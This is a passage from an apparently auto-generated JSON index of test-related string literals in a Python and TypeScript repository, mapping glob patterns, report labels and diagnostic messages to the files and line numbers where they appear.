    "(shared utilities)": {
      "value": "(shared utilities)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:202"
      ]
    },
    "(similarity:": {
      "value": "(similarity:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:593",
        "scripts/analyze_test_overlap.py:608"
      ]
    },
    "(too large)": {
      "value": "(too large)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:172"
      ]
    },
    "(under 300 line limit)": {
      "value": "(under 300 line limit)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:152"
      ]
    },
    "(unit tests)": {
      "value": "(unit tests)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:200",
        "scripts/compliance/test_size_validator.py:370"
      ]
    },
    "(~": {
      "value": "(~",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:100",
        "scripts/compliance/test_refactor_helper.py:725"
      ]
    },
    ")": {
      "value": ")",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:324",
        "auth_service/tests/test_critical_oauth_environment_failures.py:330",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:173",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:318",
        "auth_service/tests/test_database_connection_validation.py:358",
        "scripts/add_test_markers.py:101",
        "scripts/align_test_imports.py:386",
        "scripts/align_test_imports.py:388",
        "scripts/analyze_test_mocks.py:172",
        "scripts/analyze_test_mocks.py:179"
      ]
    },
    ") -": {
      "value": ") -",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:46"
      ]
    },
    ") indicates no circuit breaker": {
      "value": ") indicates no circuit breaker",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:297"
      ]
    },
    ") indicates poor overload handling": {
      "value": ") indicates poor overload handling",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:298"
      ]
    },
    "). Consider breaking down complex tests into simpler units.": {
      "value": "). Consider breaking down complex tests into simpler units.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:465"
      ]
    },
    ")...": {
      "value": ")...",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:796"
      ]
    },
    "):": {
      "value": "):",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:322",
        "scripts/test_workflows_with_act.py:338"
      ]
    },
    "): Creates confusion": {
      "value": "): Creates confusion",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:211"
      ]
    },
    "): Overlapping functionality": {
      "value": "): Overlapping functionality",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:214"
      ]
    },
    "): Should be consolidated": {
      "value": "): Should be consolidated",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:208"
      ]
    },
    ")[/red]": {
      "value": ")[/red]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:113",
        "scripts/test_oauth_local.py:128"
      ]
    },
    "*": {
      "value": "*",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:112",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:123",
        "auth_service/tests/config/test_env.py:186",
        "auth_service/tests/test_database_connection_validation.py:245",
        "scripts/check_test_compliance.py:177",
        "scripts/compliance/real_test_linter.py:264",
        "scripts/compliance/real_test_requirements_enforcer.py:530",
        "scripts/remove_test_stubs.py:113",
        "scripts/test_backend.py:480",
        "scripts/test_backend_optimized.py:367"
      ]
    },
    "* netra_pr-* (PR databases)": {
      "value": "* netra_pr-* (PR databases)",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:100"
      ]
    },
    "* netra_pr_branch_* (PR databases)": {
      "value": "* netra_pr_branch_* (PR databases)",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:99"
      ]
    },
    "* postgres (system database)": {
      "value": "* postgres (system database)",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:98"
      ]
    },
    "**": {
      "value": "**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:358",
        "scripts/compliance/real_test_requirements_enforcer.py:526",
        "scripts/compliance/real_test_requirements_enforcer.py:526",
        "scripts/compliance/real_test_requirements_enforcer.py:552",
        "scripts/compliance/real_test_validator.py:302"
      ]
    },
    "** (": {
      "value": "** (",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:552",
        "scripts/compliance/real_test_validator.py:318"
      ]
    },
    "** -": {
      "value": "** -",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:302"
      ]
    },
    "***": {
      "value": "***",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:131",
        "scripts/test_config_loading.py:50",
        "scripts/test_oauth_local.py:78"
      ]
    },
    "*** ALL WEBSOCKET TESTS PASSED! ***": {
      "value": "*** ALL WEBSOCKET TESTS PASSED! ***",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:310"
      ]
    },
    "**/": {
      "value": "**/",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:112",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:123",
        "scripts/test_frontend.py:176",
        "scripts/test_frontend.py:178",
        "scripts/test_frontend.py:180"
      ]
    },
    "**/*.py": {
      "value": "**/*.py",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:168",
        "scripts/business_value_test_index.py:181",
        "scripts/fix_e2e_test_imports.py:128",
        "scripts/fix_test_import_errors.py:146",
        "scripts/fix_test_syntax_errors.py:234",
        "scripts/standardize_l3_test_names.py:74"
      ]
    },
    "**/*.test.js": {
      "value": "**/*.test.js",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:105"
      ]
    },
    "**/*.test.jsx": {
      "value": "**/*.test.jsx",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:106"
      ]
    },
    "**/*.test.ts": {
      "value": "**/*.test.ts",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:107"
      ]
    },
    "**/*.test.ts*": {
      "value": "**/*.test.ts*",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:195"
      ]
    },
    "**/*.test.tsx": {
      "value": "**/*.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:108"
      ]
    },
    "**/*_l3.py": {
      "value": "**/*_l3.py",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:22"
      ]
    },
    "**/*_test.py": {
      "value": "**/*_test.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:73",
        "scripts/compliance/real_test_requirements_enforcer.py:98",
        "scripts/compliance/real_test_validator.py:46",
        "scripts/compliance/test_limits_checker.py:58"
      ]
    },
    "**/__tests__/**/*.js": {
      "value": "**/__tests__/**/*.js",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:109"
      ]
    },
    "**/__tests__/**/*.jsx": {
      "value": "**/__tests__/**/*.jsx",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:110"
      ]
    },
    "**/__tests__/**/*.ts": {
      "value": "**/__tests__/**/*.ts",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:111"
      ]
    },
    "**/__tests__/**/*.tsx": {
      "value": "**/__tests__/**/*.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:112"
      ]
    },
    "**/__tests__/@(components|hooks|store|services|lib|utils)/**/*.test.[jt]s?(x)": {
      "value": "**/__tests__/@(components|hooks|store|services|lib|utils)/**/*.test.[jt]s?(x)",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:188",
        "scripts/test_frontend_simple.py:37"
      ]
    },
    "**/__tests__/integration/**/*.test.[jt]s?(x)": {
      "value": "**/__tests__/integration/**/*.test.[jt]s?(x)",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:38"
      ]
    },
    "**/__tests__/integration/critical-integration.test.tsx": {
      "value": "**/__tests__/integration/critical-integration.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:40"
      ]
    },
    "**/__tests__/system/startup.test.tsx": {
      "value": "**/__tests__/system/startup.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:36"
      ]
    },
    "**/conftest.py": {
      "value": "**/conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:100"
      ]
    },
    "**/e2e/**": {
      "value": "**/e2e/**",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:254"
      ]
    },
    "**/integration/**": {
      "value": "**/integration/**",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:249"
      ]
    },
    "**/jest.setup.js": {
      "value": "**/jest.setup.js",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:113"
      ]
    },
    "**/performance/**": {
      "value": "**/performance/**",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:259"
      ]
    },
    "**/security/**": {
      "value": "**/security/**",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:264"
      ]
    },
    "**/setupTests.js": {
      "value": "**/setupTests.js",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:114"
      ]
    },
    "**/test*.py": {
      "value": "**/test*.py",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:84"
      ]
    },
    "**/test_*.py": {
      "value": "**/test_*.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:72",
        "scripts/compliance/fake_test_scanner.py:110",
        "scripts/compliance/project_test_validator.py:73",
        "scripts/compliance/real_test_requirements_enforcer.py:97",
        "scripts/compliance/real_test_validator.py:45",
        "scripts/compliance/test_limits_checker.py:57"
      ]
    },
    "**/tests/**/*.py": {
      "value": "**/tests/**/*.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:99",
        "scripts/compliance/real_test_validator.py:47"
      ]
    },
    "**/unit/**": {
      "value": "**/unit/**",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:244"
      ]
    },
    "**Description**:": {
      "value": "**Description**:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:180"
      ]
    },
    "**Duration:**": {
      "value": "**Duration:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:125"
      ]
    },
    "**Error**:\n```": {
      "value": "**Error**:\n```",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:190"
      ]
    },
    "**Exit Code**:": {
      "value": "**Exit Code**:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:181"
      ]
    },
    "**Generated:**": {
      "value": "**Generated:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:124"
      ]
    },
    "**IMPORTANT:** Manual refactoring is strongly recommended over automatic fixes.": {
      "value": "**IMPORTANT:** Manual refactoring is strongly recommended over automatic fixes.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:858"
      ]
    },
    "**Output**:\n```": {
      "value": "**Output**:\n```",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:187"
      ]
    },
    "**Top Overlaps:**": {
      "value": "**Top Overlaps:**",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:575"
      ]
    },
    "**Total LLM Cost:** $": {
      "value": "**Total LLM Cost:** $",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:151"
      ]
    },
    "**Total Violations:**": {
      "value": "**Total Violations:**",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:866",
        "scripts/compliance/project_test_validator.py:331",
        "scripts/compliance/real_test_requirements_enforcer.py:493",
        "scripts/compliance/real_test_validator.py:287"
      ]
    },
    "**⚠️ WARNING:** Some tests are already failing. Fix these before refactoring!": {
      "value": "**⚠️ WARNING:** Some tests are already failing. Fix these before refactoring!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:906"
      ]
    },
    "*.json": {
      "value": "*.json",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:178"
      ]
    },
    "*.py": {
      "value": "*.py",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "scripts/autonomous_review/test_reviewer.py:74",
        "scripts/autonomous_review/test_reviewer.py:187",
        "scripts/batch_fix_and_test.py:41",
        "scripts/batch_fix_and_test.py:42",
        "scripts/batch_fix_and_test.py:43",
        "scripts/compliance/demo_test_size_enforcement.py:74",
        "scripts/compliance/project_test_validator.py:84",
        "scripts/compliance/test_size_validator.py:138"
      ]
    },
    "*.spec.*": {
      "value": "*.spec.*",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:54",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:56"
      ]
    },
    "*.spec.ts": {
      "value": "*.spec.ts",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:96",
        "scripts/generate_test_audit.py:52"
      ]
    },
    "*.spec.tsx": {
      "value": "*.spec.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:96",
        "scripts/generate_test_audit.py:52"
      ]
    },
    "*.test.*": {
      "value": "*.test.*",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:54",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:56"
      ]
    },
    "*.test.js": {
      "value": "*.test.js",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:52"
      ]
    },
    "*.test.jsx": {
      "value": "*.test.jsx",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:52"
      ]
    },
    "*.test.ts": {
      "value": "*.test.ts",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:96",
        "scripts/generate_test_audit.py:52"
      ]
    },
    "*.test.ts*": {
      "value": "*.test.ts*",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:141"
      ]
    },
    "*.test.tsx": {
      "value": "*.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:96",
        "scripts/generate_test_audit.py:52"
      ]
    },
    "*.ts": {
      "value": "*.ts",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65"
      ]
    },
    "*.tsx": {
      "value": "*.tsx",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "scripts/autonomous_review/test_reviewer.py:188"
      ]
    },
    "*.yml": {
      "value": "*.yml",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:99",
        "scripts/test_workflows_with_act.py:103"
      ]
    },
    "*_test.py": {
      "value": "*_test.py",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:71",
        "scripts/autonomous_review/test_reviewer.py:140"
      ]
    },
    "*test*.py": {
      "value": "*test*.py",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:54",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:56"
      ]
    },
    "*test*.ts": {
      "value": "*test*.ts",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:54",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:56"
      ]
    },
    "*test.py": {
      "value": "*test.py",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:46"
      ]
    },
    "+": {
      "value": "+",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:49",
        "scripts/unified_test_runner.py:724"
      ]
    },
    "+ Cloud SQL SSL parameters handled correctly": {
      "value": "+ Cloud SQL SSL parameters handled correctly",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:262"
      ]
    },
    "+ Engine created successfully": {
      "value": "+ Engine created successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:140"
      ]
    },
    "+ Engine created with connection pool": {
      "value": "+ Engine created with connection pool",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:317"
      ]
    },
    "+ Engine creation configuration valid": {
      "value": "+ Engine creation configuration valid",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:276"
      ]
    },
    "+ Engine disposed successfully": {
      "value": "+ Engine disposed successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:145",
        "scripts/test_auth_database_sessions.py:326"
      ]
    },
    "+ URL conversion successful": {
      "value": "+ URL conversion successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:101"
      ]
    },
    "+ URL format valid": {
      "value": "+ URL format valid",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:251"
      ]
    },
    "+00:00": {
      "value": "+00:00",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:127",
        "auth_service/tests/utils/assertion_helpers.py:129"
      ]
    },
    ",": {
      "value": ",",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:194",
        "auth_service/tests/config/test_settings.py:195",
        "scripts/add_test_markers.py:220",
        "scripts/analyze_test_overlap.py:478",
        "scripts/auto_fix_test_violations.py:579",
        "scripts/automated_test_fix_loop.py:70",
        "scripts/automated_test_fix_loop.py:78",
        "scripts/compliance/fake_test_scanner.py:287",
        "scripts/fix_all_test_issues.py:49",
        "scripts/fix_all_test_issues.py:51"
      ]
    },
    ", Actual pass=": {
      "value": ", Actual pass=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:406"
      ]
    },
    ", Got:": {
      "value": ", Got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:325"
      ]
    },
    ", Improvement:": {
      "value": ", Improvement:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:345"
      ]
    },
    ", Optimization:": {
      "value": ", Optimization:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:126"
      ]
    },
    ", SPEC/testing.xml)": {
      "value": ", SPEC/testing.xml)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:156"
      ]
    },
    ", connection=": {
      "value": ", connection=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:142"
      ]
    },
    ", expected pattern": {
      "value": ", expected pattern",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:223"
      ]
    },
    ", first import at line": {
      "value": ", first import at line",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:58"
      ]
    },
    ", got": {
      "value": ", got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:38",
        "auth_service/tests/base/test_mixins.py:58",
        "auth_service/tests/test_auth_database_manager_missing_method.py:318",
        "auth_service/tests/utils/assertion_helpers.py:166",
        "auth_service/tests/utils/assertion_helpers.py:186",
        "auth_service/tests/utils/assertion_helpers.py:202",
        "auth_service/tests/utils/assertion_helpers.py:267"
      ]
    },
    ", jest.mock:": {
      "value": ", jest.mock:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:401"
      ]
    },
    ", max_files=": {
      "value": ", max_files=",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:796"
      ]
    },
    ", service2=": {
      "value": ", service2=",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:173"
      ]
    },
    ", skipping": {
      "value": ", skipping",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:822"
      ]
    },
    ", type:": {
      "value": ", type:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:578"
      ]
    },
    ", using 'unit'": {
      "value": ", using 'unit'",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:296"
      ]
    },
    ", using simple line counting:": {
      "value": ", using simple line counting:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:221"
      ]
    },
    ", ~": {
      "value": ", ~",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:285"
      ]
    },
    ",\"": {
      "value": ",\"",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:297"
      ]
    },
    ",line=": {
      "value": ",line=",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:100"
      ]
    },
    "-": {
      "value": "-",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:168",
        "auth_service/test_staging_db_connection.py:264",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:687",
        "auth_service/tests/test_session_management.py:359",
        "auth_service/tests/test_token_blacklisting_basics.py:159",
        "scripts/align_test_imports.py:435",
        "scripts/align_test_imports.py:442",
        "scripts/align_test_imports.py:447",
        "scripts/business_value_test_index.py:761",
        "scripts/check_conftest_violations.py:80"
      ]
    },
    "- **": {
      "value": "- **",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:358",
        "scripts/compliance/real_test_validator.py:318",
        "scripts/generate_test_audit.py:165"
      ]
    },
    "- **Average Score:**": {
      "value": "- **Average Score:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:185"
      ]
    },
    "- **Critical:**": {
      "value": "- **Critical:**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:494"
      ]
    },
    "- **Exact Duplicates**:": {
      "value": "- **Exact Duplicates**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:529"
      ]
    },
    "- **Exact Duplicates**: 0 ✅": {
      "value": "- **Exact Duplicates**: 0 ✅",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:529"
      ]
    },
    "- **Excessive conftest files** (": {
      "value": "- **Excessive conftest files** (",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:208"
      ]
    },
    "- **Failed**:": {
      "value": "- **Failed**:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:169"
      ]
    },
    "- **Failed:**": {
      "value": "- **Failed:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:138"
      ]
    },
    "- **Files exceeding": {
      "value": "- **Files exceeding",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:460"
      ]
    },
    "- **Functions exceeding": {
      "value": "- **Functions exceeding",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:461"
      ]
    },
    "- **Highly Similar**:": {
      "value": "- **Highly Similar**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:530"
      ]
    },
    "- **Hit Rate:**": {
      "value": "- **Hit Rate:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:175"
      ]
    },
    "- **Hits:**": {
      "value": "- **Hits:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:173"
      ]
    },
    "- **Inconsistent L3 pattern** used in": {
      "value": "- **Inconsistent L3 pattern** used in",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:221"
      ]
    },
    "- **Legacy test directories** found:": {
      "value": "- **Legacy test directories** found:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:228"
      ]
    },
    "- **Major:**": {
      "value": "- **Major:**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:495"
      ]
    },
    "- **Max Score:**": {
      "value": "- **Max Score:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:187"
      ]
    },
    "- **Min Score:**": {
      "value": "- **Min Score:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:186"
      ]
    },
    "- **Minor:**": {
      "value": "- **Minor:**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:496"
      ]
    },
    "- **Misses:**": {
      "value": "- **Misses:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:174"
      ]
    },
    "- **Multiple test configurations** (": {
      "value": "- **Multiple test configurations** (",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:211"
      ]
    },
    "- **Multiple test runners** (": {
      "value": "- **Multiple test runners** (",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:214"
      ]
    },
    "- **Non-standard naming** in": {
      "value": "- **Non-standard naming** in",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:224"
      ]
    },
    "- **Pass Rate:**": {
      "value": "- **Pass Rate:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:139"
      ]
    },
    "- **Passed**:": {
      "value": "- **Passed**:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:168"
      ]
    },
    "- **Passed:**": {
      "value": "- **Passed:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:137"
      ]
    },
    "- **Related**:": {
      "value": "- **Related**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:532"
      ]
    },
    "- **Similar**:": {
      "value": "- **Similar**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:531"
      ]
    },
    "- **Success Rate**:": {
      "value": "- **Success Rate**:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:170"
      ]
    },
    "- **Suggestion:** Extract helper methods or use fixtures": {
      "value": "- **Suggestion:** Extract helper methods or use fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:893"
      ]
    },
    "- **Suggestion:** Split into multiple focused test modules": {
      "value": "- **Suggestion:** Split into multiple focused test modules",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:891"
      ]
    },
    "- **Total Similarity Pairs**:": {
      "value": "- **Total Similarity Pairs**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:525"
      ]
    },
    "- **Total Test Files**:": {
      "value": "- **Total Test Files**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:523"
      ]
    },
    "- **Total Test Functions**:": {
      "value": "- **Total Test Functions**:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:524"
      ]
    },
    "- **Total Tests:**": {
      "value": "- **Total Tests:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:136"
      ]
    },
    "- **Total Validations:**": {
      "value": "- **Total Validations:**",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:188"
      ]
    },
    "- **Total test files scanned:**": {
      "value": "- **Total test files scanned:**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:459"
      ]
    },
    "- **Total violations:**": {
      "value": "- **Total violations:**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:462"
      ]
    },
    "- ... and": {
      "value": "- ... and",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:361"
      ]
    },
    "- API:": {
      "value": "- API:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:45"
      ]
    },
    "- All services correctly default to STAGING (not production)": {
      "value": "- All services correctly default to STAGING (not production)",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:170"
      ]
    },
    "- Allow dev login:": {
      "value": "- Allow dev login:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:143"
      ]
    },
    "- Allow mock auth:": {
      "value": "- Allow mock auth:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:144"
      ]
    },
    "- App:": {
      "value": "- App:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:44"
      ]
    },
    "- Auth service trying to connect to 'postgres' database": {
      "value": "- Auth service trying to connect to 'postgres' database",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:108"
      ]
    },
    "- Auth:": {
      "value": "- Auth:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:46"
      ]
    },
    "- Available databases on instance:": {
      "value": "- Available databases on instance:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:97"
      ]
    },
    "- Avg Complexity:": {
      "value": "- Avg Complexity:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:563"
      ]
    },
    "- But application schema might not exist in 'postgres' database": {
      "value": "- But application schema might not exist in 'postgres' database",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:109"
      ]
    },
    "- But code was expecting 'netra_staging'": {
      "value": "- But code was expecting 'netra_staging'",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:96"
      ]
    },
    "- CLAUDE.md (development standards)": {
      "value": "- CLAUDE.md (development standards)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:316"
      ]
    },
    "- CRITICAL:": {
